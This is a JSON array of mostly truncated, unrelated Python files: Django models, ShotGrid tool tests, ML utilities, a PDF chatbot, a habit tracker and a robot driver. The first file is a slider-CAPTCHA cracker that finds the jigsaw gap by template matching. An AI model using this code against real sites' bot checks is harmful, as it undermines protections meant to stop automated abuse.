[
    "import cv2\nimport numpy as np\nimport os\n\n\nclass CrackHuaKuaiImage:\n\n    @staticmethod\n    def getPos(origin_background_image: np.ndarray, origin_jigsaw_image: np.ndarray):\n        back_image = origin_background_image.copy()\n        jigsaw_image = origin_jigsaw_image.copy()\n        jigsaw_morphoImage = cv2.morphologyEx(jigsaw_image, cv2.MORPH_OPEN, np.ones((3, 3), np.int8))\n        back_morphoImage = cv2.morphologyEx(back_image, cv2.MORPH_OPEN, np.ones((3, 3), np.int8))\n        jigsaw_canny_image = cv2.Canny(jigsaw_morphoImage, 50, 150)\n        back_canny_image = cv2.Canny(back_morphoImage, 50, 150)\n        result = cv2.matchTemplate(back_canny_image, jigsaw_canny_image, cv2.TM_CCOEFF_NORMED)\n\n        return cv2.minMaxLoc(result)[3]\n\n\nif __name__ == \"__main__\":\n    back_picPath = f\"{os.path.dirname(__file__)}/background.png\"\n    jigsaw_picPath = f\"{os.path.dirname(__file__)}/slider.png\"\n\n    background_image = cv2.imread(back_picPath, cv2.COLOR_RGB2BGR)\n    jigsaw_image = cv2.imread(jigsaw_picPath, cv2.COLOR_RGB2BGR)\n    pos = CrackHuaKuaiImage.getPos(background_image, jigsaw_image)\n    pic = np.hstack([jigsaw_image, background_image])\n    cv2.rectangle(\n        background_image,\n        (pos[0], pos[1]),\n        (pos[0] + jigsaw_image.shape[1], pos[1] + jigsaw_image.shape[0]),\n        (0, 255, 255),\n        2,\n    )\n\n    cv2.imshow(\"pic\", pic)\n    cv2.imwrite(f\"{os.path.dirname(__file__)}/draw_rect.png\", background_image)\n    cv2.waitKey()\n    cv2.destroyAllWindows()\n",
    "# This is an auto-generated Django model module.\n# You'll have to do the following manually to clean this up:\n#   * Rearrange models' order\n#   * Make sure each model has one field with primary_key=True\n#   * Make sure each ForeignKey and OneToOneField has `on_delete` set to the desired behavior\n#   * Remove `managed = False` lines if you wish to allow Django to create, modify, and delete the table\n# Feel free to rename the models, but don't rename db_table values or field names.\nfrom django.db import models\nimport uuid\n\nclass AuthGroup(models.Model):\n    name = models.CharField(unique=True, max_length=150)\n\n    class Meta:\n        managed = False\n        db_table = 'auth_group'\n\n\nclass AuthGroupPermissions(models.Model):\n    id = models.BigAutoField(primary_key=True)\n    group = models.ForeignKey(AuthGroup, models.DO_NOTHING)\n    permission = models.ForeignKey('AuthPermission', models.DO_NOTHING)\n\n    class Meta:\n        managed = False\n        db_table = 'auth_group_permissions'\n        unique_together = (('group', 'permission'),)\n\n\nclass AuthPermission(models.Model):\n    name = models.CharField(max_length=255)\n    content_type = models.ForeignKey('DjangoContentType', models.DO_NOTHING)\n    codename = models.CharField(max_length=100)\n\n    class Meta:\n        managed = False\n        db_table = 'auth_permission'\n        unique_together = (('content_type', 'codename'),)\n\n\nclass AuthUser(models.Model):\n    password = models.CharField(max_length=128)\n    last_login = models.DateTimeField(blank=True, null=True)\n    is_superuser = models.IntegerField()\n    username = models.CharField(unique=True, max_length=150)\n    first_name = models.CharField(max_length=150)\n    last_name = models.CharField(max_length=150)\n    email = models.CharField(max_length=254)\n    is_staff = models.IntegerField()\n    is_active = models.IntegerField()\n    date_joined = models.DateTimeField()\n\n    class Meta:\n        managed = False\n        db_table = 'auth_user'\n\n\nclass AuthUserGroups(models.Model):\n    id = models.BigAutoField(primary_key=True)\n    user = models.ForeignKey(AuthUser, models.DO_NOTHING)\n    group = models.ForeignKey(AuthGroup, models.DO_NOTHING)\n\n    class Meta:\n        managed = False\n        db_table = 'auth_user_groups'\n        unique_together = (('user', 'group'),)\n\n\nclass AuthUserUserPermissions(models.Model):\n    id = models.BigAutoField(primary_key=True)\n    user = models.ForeignKey(AuthUser, models.DO_NOTHING)\n    permission = models.ForeignKey(AuthPermission, models.DO_NOTHING)\n\n    class Meta:\n        managed = False\n        db_table = 'auth_user_user_permissions'\n        unique_together = (('user', 'permission'),)\n\n\nclass DjangoAdminLog(models.Model):\n    action_time = models.DateTimeField()\n    object_id = models.TextField(blank=True, null=True)\n    object_repr = models.CharField(max_length=200)\n    action_flag = models.PositiveSmallIntegerField()\n    change_message = models.TextField()\n    content_type = models.ForeignKey('DjangoContentType', models.DO_NOTHING, blank=True, null=True)\n    user = models.ForeignKey(AuthUser, models.DO_NOTHING)\n\n    class Meta:\n        managed = False\n        db_table = 'django_admin_log'\n\n\nclass DjangoContentType(models.Model):\n    app_label = models.CharField(max_length=100)\n    model = models.CharField(max_length=100)\n\n    class Meta:\n        managed = False\n        db_table = 'django_content_type'\n        unique_together = (('app_label', 'model'),)\n\n\nclass DjangoMigrations(models.Model):\n    id = models.BigAutoField(primary_key=True)\n    app = models.CharField(max_length=255)\n    name = models.CharField(max_length=255)\n    applied = models.DateTimeField()\n\n    class Meta:\n        managed = False\n        db_table = 'django_migrations'\n\n\nclass DjangoSession(models.Model):\n    session_key = models.CharField(primary_key=True, max_length=40)\n    session_data = models.TextField()\n    expire_date = models.DateTimeField()\n\n    class Meta:\n        managed = False\n        db_table = 'django_session'\n\n\nclass Filmy(models.Model):\n    filmid = models.AutoField(db_column='FilmID', primary_key=True)  # Field name made lowercase.\n    tytul = models.CharField(db_column='Tytul', max_length=100, blank=True, null=True)  # Field name made lowercase.\n    opis = models.TextField(db_column='Opis', blank=True, null=True)  # Field name made lowercase.\n    gatunekid = models.ForeignKey('Gatunek', models.DO_NOTHING, db_column='GatunekID')  # Field name made lowercase.\n    rezyserid = models.ForeignKey('Rezyser', models.DO_NOTHING, db_column='RezyserID')  # Field name made lowercase.\n    czastrwania = models.SmallIntegerField(db_column='CzasTrwania', blank=True, null=True)  # Field name made lowercase.\n    rokprodukcji = models.SmallIntegerField(db_column='RokProdukcji', blank=True, null=True)  # Field name made lowercase.\n    wiekodbiorcy = models.IntegerField(db_column='WiekOdbiorcy', blank=True, null=True)  # Field name made lowercase.\n\n    def __str__(self):\n        return self.tytul + \" (\" + str(se",
    "\"\"\"Test module for ShotGrid MCP server.\n\nThis module contains unit tests for the ShotGrid MCP server tools.\n\"\"\"\n\n# Import built-in modules\nimport json\nfrom pathlib import Path\n\n# Import third-party modules\nimport pytest\nfrom fastmcp import FastMCP\nfrom fastmcp.exceptions import ToolError\nfrom shotgun_api3.lib.mockgun import Shotgun\n\n\n@pytest.mark.asyncio\nclass TestCreateTools:\n    \"\"\"Test suite for create tools.\"\"\"\n\n    async def test_create_entity(self, server: FastMCP, mock_sg: Shotgun):\n        \"\"\"Test creating a single entity.\"\"\"\n        # Create entity using MCP tool\n        entity_type = \"Shot\"\n        data = {\"code\": \"new_shot\", \"project\": mock_sg.find_one(\"Project\", [[\"code\", \"is\", \"test\"]])}\n\n        await server.call_tool(\"create_entity\", {\"entity_type\": entity_type, \"data\": data})\n\n        # Verify entity was created\n        created_shot = mock_sg.find_one(entity_type, [[\"code\", \"is\", \"new_shot\"]])\n        assert created_shot is not None\n        assert created_shot[\"code\"] == data[\"code\"]\n        assert created_shot[\"project\"] == data[\"project\"]\n\n    async def test_batch_create_entities(self, server: FastMCP, mock_sg: Shotgun):\n        \"\"\"Test creating multiple entities.\"\"\"\n        # Setup test data\n        entity_type = \"Shot\"\n        project = mock_sg.find_one(\"Project\", [[\"code\", \"is\", \"test\"]])\n        data_list = [{\"code\": \"batch_shot_001\", \"project\": project}, {\"code\": \"batch_shot_002\", \"project\": project}]\n\n        # Create entities using MCP tool\n        await server.call_tool(\"batch_create_entities\", {\"entity_type\": entity_type, \"data_list\": data_list})\n\n        # Verify entities were created\n        entities = mock_sg.find(\"Shot\", [[\"code\", \"in\", [\"batch_shot_001\", \"batch_shot_002\"]]])\n        assert len(entities) == 2\n\n\n@pytest.mark.asyncio\nclass TestReadTools:\n    \"\"\"Test suite for read tools.\"\"\"\n\n    async def test_get_schema(self, server: FastMCP, mock_sg: Shotgun):\n        \"\"\"Test getting schema for a specific entity type.\"\"\"\n        entity_type = \"Shot\"\n\n        # Get schema using MCP tool\n        response = await server.call_tool(\"get_schema\", {\"entity_type\": entity_type})\n        response_dict = json.loads(response[0].text)\n\n        # Verify schema\n        assert response_dict is not None\n        assert \"fields\" in response_dict\n        assert \"id\" in response_dict[\"fields\"]\n        assert \"type\" in response_dict[\"fields\"]\n        assert \"code\" in response_dict[\"fields\"]\n\n\n@pytest.mark.asyncio\nclass TestUpdateTools:\n    \"\"\"Test suite for update tools.\"\"\"\n\n    async def test_update_entity(self, server: FastMCP, mock_sg: Shotgun):\n        \"\"\"Test updating a single entity.\"\"\"\n        # Find test shot\n        shot = mock_sg.find_one(\"Shot\", [[\"code\", \"is\", \"test_shot\"]])\n        assert shot is not None\n\n        # Update entity using MCP tool\n        new_code = \"updated_shot\"\n        await server.call_tool(\n            \"update_entity\", {\"entity_type\": \"Shot\", \"entity_id\": shot[\"id\"], \"data\": {\"code\": new_code}}\n        )\n\n        # Verify update\n        updated_shot = mock_sg.find_one(\"Shot\", [[\"id\", \"is\", shot[\"id\"]]])\n        assert updated_shot is not None\n        assert updated_shot[\"code\"] == new_code\n\n\n@pytest.mark.asyncio\nclass TestDeleteTools:\n    \"\"\"Test suite for delete tools.\"\"\"\n\n    async def test_delete_entity(self, server: FastMCP, mock_sg: Shotgun):\n        \"\"\"Test deleting a single entity.\"\"\"\n        # Create entity to delete\n        project = mock_sg.find_one(\"Project\", [[\"code\", \"is\", \"test\"]])\n        shot_to_delete = mock_sg.create(\"Shot\", {\"code\": \"shot_to_delete\", \"project\": project})\n\n        # Delete entity using MCP tool\n        await server.call_tool(\"delete_entity\", {\"entity_type\": \"Shot\", \"entity_id\": shot_to_delete[\"id\"]})\n\n        # Verify deletion\n        deleted_shot = mock_sg.find_one(\"Shot\", [[\"id\", \"is\", shot_to_delete[\"id\"]]])\n        assert deleted_shot is None\n\n\n@pytest.mark.asyncio\nclass TestDownloadTools:\n    \"\"\"Test suite for download tools.\"\"\"\n\n    @pytest.fixture\n    def temp_dir(self, tmp_path):\n        \"\"\"Create a temporary directory for downloads.\"\"\"\n        return tmp_path\n\n    async def test_download_thumbnail(self, server: FastMCP, mock_sg: Shotgun, temp_dir: Path):\n        \"\"\"Test downloading a thumbnail.\"\"\"\n        # Create test shot without attachment\n        project = mock_sg.find_one(\"Project\", [[\"code\", \"is\", \"main\"]])\n        shot = mock_sg.create(\n            \"Shot\",\n            {\n                \"code\": \"shot_with_thumbnail\",\n                \"project\": project,\n                \"sg_status_list\": \"ip\",\n                \"description\": \"Test shot with thumbnail\",\n            },\n        )\n\n        # Add thumbnail directly to the entity\n        mock_sg.update(\n            \"Shot\",\n            shot[\"id\"],\n            {\"image\": {\"url\": \"https://example.com/thumbnail.jpg\", \"type\": \"Attachment\"}},\n        )\n\n        # Download thumbnail using MCP tool\n        file_path = temp_dir / \"thumbnail.jpg\"\n        response = await server.call_tool",
    "import torch\nimport math\nimport matplotlib.pyplot as plt\n\nclass LRFinder:\n    def __init__(self, model, optimizer, criterion, device):\n        self.model = model\n        self.optimizer = optimizer\n        self.criterion = criterion\n        self.device = device\n        \n    def range_test(self, train_loader, end_lr=10, num_iter=100):\n        \"\"\"Perform learning rate range test\"\"\"\n        lr_mult = (end_lr / self.optimizer.param_groups[0]['lr']) ** (1/num_iter)\n        best_loss = float('inf')\n        avg_loss = 0.\n        lr_history = []\n        loss_history = []\n        \n        for batch_idx, batch in enumerate(train_loader):\n            if batch_idx >= num_iter:\n                break\n                \n            # Forward pass\n            loss = self._training_step(batch)\n            \n            # Update learning rate\n            self.optimizer.param_groups[0]['lr'] *= lr_mult\n            \n            # Track best loss and lr\n            avg_loss = 0.98 * avg_loss + 0.02 * loss\n            smoothed_loss = avg_loss / (1 - 0.98**(batch_idx+1))\n            \n            if smoothed_loss < best_loss:\n                best_loss = smoothed_loss\n                best_lr = self.optimizer.param_groups[0]['lr']\n                \n            lr_history.append(self.optimizer.param_groups[0]['lr'])\n            loss_history.append(smoothed_loss)\n            \n        return best_lr, lr_history, loss_history\n",
    "import torch\nimport hashlib\nimport requests\nimport torch.nn as nn\nfrom torchvision import models\nfrom collections import namedtuple\nimport os\nfrom tqdm import tqdm\n\nURL_MAP = {\"vgg_lpips\": \"https://heibox.uni-heidelberg.de/f/607503859c864bc1b30b/?dl=1\"}\n\nCKPT_MAP = {\"vgg_lpips\": \"vgg.pth\"}\n\nMD5_MAP = {\"vgg_lpips\": \"d507d7349b931f0638a25a48a722f98a\"}\n\n\n\ndef download(url, local_path, chunk_size=1024):\n    os.makedirs(os.path.split(local_path)[0], exist_ok=True)\n    with requests.get(url, stream=True) as r:\n        total_size = int(r.headers.get(\"content-length\", 0))\n        with tqdm(total=total_size, unit=\"B\", unit_scale=True) as pbar:\n            with open(local_path, \"wb\") as f:\n                for data in r.iter_content(chunk_size=chunk_size):\n                    if data:\n                        f.write(data)\n                        pbar.update(chunk_size)\n\n\ndef md5_hash(path):\n    with open(path, \"rb\") as f:\n        content = f.read()\n    return hashlib.md5(content).hexdigest()\n\n\ndef get_ckpt_path(name, root, check=False):\n    assert name in URL_MAP\n    path = os.path.join(root, CKPT_MAP[name])\n    if not os.path.exists(path) or (check and not md5_hash(path) == MD5_MAP[name]):\n        print(\"Downloading {} model from {} to {}\".format(name, URL_MAP[name], path))\n        download(URL_MAP[name], path)\n        md5 = md5_hash(path)\n        assert md5 == MD5_MAP[name], md5\n    return path\n\n\nclass LPIPS(nn.Module):\n    # Learned perceptual metric\n    def __init__(self, use_dropout=True):\n        super().__init__()\n        self.scaling_layer = ScalingLayer()\n        self.chns = [64, 128, 256, 512, 512]  # vgg16 features\n        self.net = vgg16(pretrained=True, requires_grad=False)\n        self.lin0 = NetLinLayer(self.chns[0], use_dropout=use_dropout)\n        self.lin1 = NetLinLayer(self.chns[1], use_dropout=use_dropout)\n        self.lin2 = NetLinLayer(self.chns[2], use_dropout=use_dropout)\n        self.lin3 = NetLinLayer(self.chns[3], use_dropout=use_dropout)\n        self.lin4 = NetLinLayer(self.chns[4], use_dropout=use_dropout)\n        self.load_from_pretrained()\n        for param in self.parameters():\n            param.requires_grad = False\n\n    def load_from_pretrained(self, name=\"vgg_lpips\"):\n        ckpt = get_ckpt_path(name, \"movqgan/modules/losses/lpips\")\n        self.load_state_dict(\n            torch.load(ckpt, map_location=torch.device(\"cpu\")), strict=False\n        )\n        print(\"loaded pretrained LPIPS loss from {}\".format(ckpt))\n\n    @classmethod\n    def from_pretrained(cls, name=\"vgg_lpips\"):\n        if name != \"vgg_lpips\":\n            raise NotImplementedError\n        model = cls()\n        ckpt = get_ckpt_path(name)\n        model.load_state_dict(\n            torch.load(ckpt, map_location=torch.device(\"cpu\")), strict=False\n        )\n        return model\n\n    def forward(self, input, target):\n        in0_input, in1_input = (self.scaling_layer(input), self.scaling_layer(target))\n        outs0, outs1 = self.net(in0_input), self.net(in1_input)\n        feats0, feats1, diffs = {}, {}, {}\n        lins = [self.lin0, self.lin1, self.lin2, self.lin3, self.lin4]\n        for kk in range(len(self.chns)):\n            feats0[kk], feats1[kk] = normalize_tensor(outs0[kk]), normalize_tensor(\n                outs1[kk]\n            )\n            diffs[kk] = (feats0[kk] - feats1[kk]) ** 2\n\n        res = [\n            spatial_average(lins[kk].model(diffs[kk]), keepdim=True)\n            for kk in range(len(self.chns))\n        ]\n        val = res[0]\n        for l in range(1, len(self.chns)):\n            val += res[l]\n        return val\n\n\nclass ScalingLayer(nn.Module):\n    def __init__(self):\n        super(ScalingLayer, self).__init__()\n        self.register_buffer(\n            \"shift\", torch.Tensor([-0.030, -0.088, -0.188])[None, :, None, None]\n        )\n        self.register_buffer(\n            \"scale\", torch.Tensor([0.458, 0.448, 0.450])[None, :, None, None]\n        )\n\n    def forward(self, inp):\n        # convert imagenet normalized data to [-1, 1]\n        return (inp - self.shift) / self.scale\n\n\nclass NetLinLayer(nn.Module):\n    \"\"\"A single linear layer which does a 1x1 conv\"\"\"\n\n    def __init__(self, chn_in, chn_out=1, use_dropout=False):\n        super(NetLinLayer, self).__init__()\n        layers = (\n            [\n                nn.Dropout(),\n            ]\n            if (use_dropout)\n            else []\n        )\n        layers += [\n            nn.Conv2d(chn_in, chn_out, 1, stride=1, padding=0, bias=False),\n        ]\n        self.model = nn.Sequential(*layers)\n\n\nclass vgg16(torch.nn.Module):\n    def __init__(self, requires_grad=False, pretrained=True):\n        super(vgg16, self).__init__()\n        vgg_pretrained_features = models.vgg16(pretrained=pretrained)\n        vgg_pretrained_features = vgg_pretrained_features.features\n        self.slice1 = torch.nn.Sequential()\n        self.slice2 = torch.nn.Sequential()\n        self.slice3 = torch.nn.Sequential()\n        self.slice4 = torch.nn.Sequential()\n        self.slic",
    "import streamlit as st\nimport PyPDF2\nfrom llama_index.llms.ollama import Ollama\n\n# Initialize the Ollama model\nllm = Ollama(model=\"llama3.1:latest\", base_url=\"http://10.0.11i.180:11434\", request_timeout=60.0)\n\n# Function to extract text from PDF\ndef extract_text_from_pdf(pdf_file):\n    reader = PyPDF2.PdfReader(pdf_file)\n    text = \"\"\n    for page in reader.pages:\n        text += page.extract_text()\n    return text\n\n# Streamlit App\nst.title(\"\ud83d\udcc4 PDF Chatbot with Ollama\")\n\n# Upload PDF file\nuploaded_file = st.file_uploader(\"Upload a PDF file\", type=\"pdf\")\n\n# Initialize session state for chat history\nif \"chat_history\" not in st.session_state:\n    st.session_state.chat_history = []\n\nif uploaded_file is not None:\n    # Extract text from PDF\n    pdf_text = extract_text_from_pdf(uploaded_file)\n    st.success(\"PDF uploaded and text extracted successfully!\")\n\n    # Separate interface for conversation\n    st.subheader(\"Conversation History\")\n\n    # Display chat history in a structured format\n    for i, message in enumerate(st.session_state.chat_history):\n        if message[\"role\"] == \"user\":\n            st.markdown(f\"**Query {i//2 + 1}:** {message['content']}\")\n        elif message[\"role\"] == \"assistant\":\n            st.markdown(f\"**Response {i//2 + 1}:** {message['content']}\")\n            st.markdown(\"---\")  # Add a separator between query-response pairs\n\n    # Chat input\n    user_input = st.text_input(\"Ask a question about the PDF:\")\n\n    if user_input:\n        # Add user question to chat history\n        st.session_state.chat_history.append({\"role\": \"user\", \"content\": user_input})\n\n        # Combine PDF text with user input\n        prompt = f\"PDF Content: {pdf_text}\\n\\nUser Question: {user_input}\"\n\n        # Generate response using Ollama\n        with st.spinner(\"Generating response...\"):\n            response = llm.complete(prompt)\n\n        # Add bot response to chat history\n        st.session_state.chat_history.append({\"role\": \"assistant\", \"content\": str(response)})\n\n        # Rerun the app to update the conversation history\n        st.rerun()\nelse:\n    st.info(\"Please upload a PDF file to get started.\")\n",
    "import sys\nimport os\nimport argparse\nfrom pathlib import Path\nfrom datetime import datetime, timedelta\nimport json\nimport logging\nimport threading\nimport traceback\nimport time\nfrom PIL import Image, ImageDraw\n\ndef parse_args():\n    parser = argparse.ArgumentParser(description='Habit Tracker')\n    parser.add_argument('--test', action='store_true', help='Run in test mode')\n    parser.add_argument('--week', type=int, choices=[0,1,2,3], help='Which 14-week chunk to display (0-3)')\n    parser.add_argument('--json', type=str, help='JSON file to use for test data')\n    parser.add_argument('--generate-patterns', action='store_true', help='Generate test pattern JSON files')\n    return parser.parse_args()\n\nargs = parse_args()\nTEST_MODE = args.test\n\n# Import waveshare library for both test and normal mode\nhome = str(Path.home())\nlibdir = os.path.join(home, 'e-Paper/RaspberryPi_JetsonNano/python/lib')\nif os.path.exists(libdir):\n    sys.path.append(libdir)\nelse:\n    raise ImportError(f\"Waveshare library not found in expected location: {libdir}\")\nfrom waveshare_epd import epd2in13_V4\n\n# Only import Flask for web mode\nif not TEST_MODE:\n    from flask import Flask, render_template, jsonify, request\n\nlogging.basicConfig(level=logging.DEBUG)\nif not TEST_MODE:\n    app = Flask(__name__)\n\nclass HabitTracker:\n    def __init__(self, test_date=None, test_json=None):\n        self.epd = None\n        self.test_mode = test_date is not None\n        self.test_date = test_date\n        self.test_json = test_json\n        self._init_display()\n        self.SQUARE_SIZE = 16\n        self.PADDING = 1\n        self.EDGE_PADDING = 2\n        self.ROWS = 14\n        self.COLS = 7\n        self.data_file = test_json if test_json else 'habit_data.json'\n        self.lock = threading.Lock()\n        self.last_display_start_date = None\n        \n        if not self.test_mode:\n            refresh_thread = threading.Thread(target=self.refresh_display_periodically, daemon=True)\n            refresh_thread.start()\n\n    def _init_display(self):\n        try:\n            self.epd = epd2in13_V4.EPD()\n            self.height = self.epd.height\n            self.width = self.epd.width\n            self.epd.init()\n            self.epd.Clear(0xFF)\n            # Put display to sleep after initialization\n            self.epd.sleep()\n        except Exception as e:\n            logging.error(f\"Error initializing display: {e}\")\n            traceback.print_exc()\n\n    def get_current_date(self):\n        return self.test_date if self.test_mode else datetime.now().date()\n\n    def load_data(self):\n        with self.lock:\n            if os.path.exists(self.data_file):\n                with open(self.data_file, 'r') as f:\n                    return json.load(f)\n            return {}\n\n    def save_data(self, data):\n        with self.lock:\n            with open(self.data_file, 'w') as f:\n                json.dump(data, f)\n\n    def mark_date(self, date_str, completed=True):\n        data = self.load_data()\n        if completed:\n            data[date_str] = 1\n        else:\n            data.pop(date_str, None)\n        self.save_data(data)\n        # Force a display update by clearing the last display date\n        self.last_display_start_date = None\n        self.update_display()\n\n    def get_eink_date_range(self):\n        \"\"\"Calculate the 14-week period.\"\"\"\n        new_year = datetime(2025, 1, 1).date()\n        first_monday = new_year - timedelta(days=new_year.weekday())\n        \n        if self.test_mode:\n            # For test mode, use the specified week chunk directly\n            period_start = first_monday + timedelta(weeks=14 * args.week)\n            period_end = period_start + timedelta(weeks=14, days=-1)\n        else:\n            # For normal mode, calculate based on current date\n            today = self.get_current_date()\n            current_monday = today - timedelta(days=today.weekday())\n            days_since_first_monday = (current_monday - first_monday).days\n            current_period = days_since_first_monday // (14 * 7)\n            period_start = first_monday + timedelta(weeks=14 * current_period)\n            period_end = period_start + timedelta(weeks=14, days=-1)\n        \n        # Ensure we don't display beyond 2025\n        period_end = min(period_end, datetime(2025, 12, 31).date())\n        \n        return period_start, period_end\n\n    def update_display(self):\n        \"\"\"Update the display with the current 14-week period.\"\"\"\n        logging.info(\"Starting display update\")\n        try:\n            logging.info(\"Updating display\")\n            start_date, end_date = self.get_eink_date_range()\n            \n            if not self.test_mode and self.last_display_start_date == start_date:\n                logging.info(\"Display is already up-to-date.\")\n                return\n            \n            self.last_display_start_date = start_date\n            \n            if not self.test_mode and self.epd is None:\n                self._init_display()\n            \n            self.epd.init(",
    "# Copyright (c) 2024, RoboVerse community\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are met:\n#\n# 1. Redistributions of source code must retain the above copyright notice, this\n#    list of conditions and the following disclaimer.\n#\n# 2. Redistributions in binary form must reproduce the above copyright notice,\n#    this list of conditions and the following disclaimer in the documentation\n#    and/or other materials provided with the distribution.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\n# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\nfrom rclpy.qos import QoSProfile, QoSReliabilityPolicy, QoSHistoryPolicy\nimport json\nimport logging\nimport os\nimport threading\nimport asyncio\n\nfrom aiortc import MediaStreamTrack\nfrom cv_bridge import CvBridge\n\n\nfrom scripts.go2_constants import ROBOT_CMD, RTC_TOPIC\nfrom scripts.go2_func import gen_command, gen_mov_command,gen_topic_command\nfrom scripts.go2_lidar_decoder import update_meshes_for_cloud2\nfrom scripts.go2_math import get_robot_joints\nfrom scripts.go2_camerainfo import load_camera_info\nfrom scripts.webrtc_driver import Go2Connection\n\nimport rclpy\nfrom rclpy.node import Node\nfrom rclpy.qos import QoSProfile\n\nfrom tf2_ros import TransformBroadcaster, TransformStamped\nfrom geometry_msgs.msg import Twist, TransformStamped, PoseStamped\nfrom go2_interfaces.msg import Go2State, IMU\nfrom unitree_go.msg import LowState\nfrom sensor_msgs.msg import PointCloud2, PointField, JointState, Joy\nfrom sensor_msgs_py import point_cloud2\nfrom std_msgs.msg import Header\nfrom nav_msgs.msg import Odometry\nfrom sensor_msgs.msg import Image, CameraInfo\n\n\nlogging.basicConfig(level=logging.WARN)\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.INFO)\n\n\nclass RobotBaseNode(Node):\n\n    def __init__(self):\n        super().__init__('go2_driver_node')\n        self.publish_counter = 0  # \u7b80\u5355\u7684\u5355\u4e2a\u8ba1\u6570\u5668\n        self.get_logger().info(f\"66666666666666666666666666666666666666666666666666666666666666\")\n\n\n        self.declare_parameter('robot_ip', os.getenv(\n            'ROBOT_IP', os.getenv('GO2_IP')))\n        self.declare_parameter('token', os.getenv(\n            'ROBOT_TOKEN', os.getenv('GO2_TOKEN', '')))\n        self.declare_parameter('conn_type', os.getenv(\n            'CONN_TYPE', os.getenv('CONN_TYPE', '')))\n\n        self.robot_ip = self.get_parameter(\n            'robot_ip').get_parameter_value().string_value\n        self.token = self.get_parameter(\n            'token').get_parameter_value().string_value\n        self.robot_ip_lst = self.robot_ip.replace(\" \", \"\").split(\",\")\n        self.conn_type = self.get_parameter(\n            'conn_type').get_parameter_value().string_value\n\n        self.conn_mode = \"single\" if len(self.robot_ip_lst) == 1 else \"multi\"\n\n        self.get_logger().info(f\"Received ip list: {self.robot_ip_lst}\")\n        self.get_logger().info(f\"Connection type is {self.conn_type}\")\n\n        self.get_logger().info(f\"Connection mode is {self.conn_mode}\")\n\n        self.conn = {}\n        qos_profile = QoSProfile(depth=10)\n        lidar_qos = QoSProfile(\n            reliability=QoSReliabilityPolicy.BEST_EFFORT,\n            history=QoSHistoryPolicy.KEEP_LAST,\n            depth=1\n        )\n\n        self.joint_pub = []\n        self.go2_state_pub = []\n        self.go2_lidar_pub = []\n        self.go2_odometry_pub = []\n        self.imu_pub = []\n       # self.img_pub = []\n        self.camera_info_pub = []\n\n        if self.conn_mode == 'single':\n            self.joint_pub.append(self.create_publisher(\n                JointState, 'joint_states', qos_profile))\n            self.go2_state_pub.append(self.create_publisher(\n                Go2State, 'go2_states', qos_profile))\n            self.go2_lidar_pub.append(self.create_publisher(\n                PointCloud2, 'point_cloud2', lidar_qos))\n            # self.go2_lidar_pub.append(self.create_publisher(\n            #     PointCloud2, 'point_cloud2', qos_profile))\n            self.go2_odometry_pub.append(\n                self.create_publisher(Odometry, 'odom', qos_profile))\n            self.imu_pub.append(self.create_publisher(IMU, 'imu', qos_profile))\n           # self.img_pub.append(self.create_publisher(Image, 'camera/image_raw', qos_profile))\n            self.camera_inf",
    "################################################################################\n# MIT License\n#\n# Copyright (c) 2025 Hajime Nakagami\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\nimport sys\nimport json\nimport time\n\n__version__ = \"0.1.2\"\n\n\ndef _requests_get(url, params=None, headers=None):\n    import requests\n    def _urlencode(params):\n        converted = []\n        for k, s in params.items():\n            s = str(s)\n            v = \"\"\n            for b in s.encode(\"utf8\"):\n                if chr(b) in \"0123456789abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-._~\":\n                    v += chr(b)\n                else:\n                    v += r\"%\" + hex(b)[2:]\n            converted.append(f\"{k}={v}\")\n\n        return \"&\".join(converted)\n\n    if sys.implementation.name == \"micropython\":\n        if params:\n            url = url.rstrip('?') + '?' + _urlencode(params)\n        response = requests.get(url, headers=headers)\n    else:\n        if params:\n            response = requests.get(url, params=params, headers=headers)\n        else:\n            response = requests.get(url, headers=headers)\n    json_response = response.json()\n    if \"error\" in json_response:\n        raise ProtocolError(json_response)\n    return json_response\n\n\ndef _requests_post(url, data=None, headers=None):\n    import requests\n    if data:\n        response = requests.post(url, data=data, headers=headers)\n    else:\n        response = requests.post(url, headers=headers)\n    if not response.text:\n        return None\n    json_response = response.json()\n    if \"error\" in json_response:\n        raise ProtocolError(json_response)\n    return json_response\n\n\nclass ProtocolError(Exception):\n    def __init__(self, json_response):\n        self._data = json_response\n        super().__init__(f\"{self.error}:{self.message}\")\n\n    def 